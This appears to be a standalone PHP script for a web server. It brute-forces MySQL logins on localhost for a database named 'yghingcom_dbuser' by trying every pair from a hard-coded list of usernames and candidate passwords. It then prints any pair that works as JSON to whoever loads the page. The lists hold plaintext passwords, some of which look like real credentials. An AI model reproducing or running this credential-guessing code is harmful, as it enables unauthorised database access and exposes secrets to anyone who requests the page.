<?php
header('Content-Type: application/json');

$passwords = [
    '123Yg!@#',
    '123yg!@#',
    '123Yg!@',
    '123Yg@#',
    '123Yg',
    'yg@dmin',
    'PmbrvF3@KqCtVsv',
];

$users = [
    'yghingcom_dbuser',
    'dbuser',
    'yghingcom_user',
    'yghingcom_admin',
];

$found = null;

foreach ($users as $u) {
    foreach ($passwords as $p) {
        try {
            $pdo = new PDO("mysql:host=localhost;dbname=yghingcom_dbuser;charset=utf8mb4", $u, $p, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_TIMEOUT => 2,
            ]);
            $found = ['user' => $u, 'pass' => $p];
            break 2;
        } catch (Exception $e) {}
    }
}

echo json_encode([
    'foundWorkingCredentials' => $found
]);
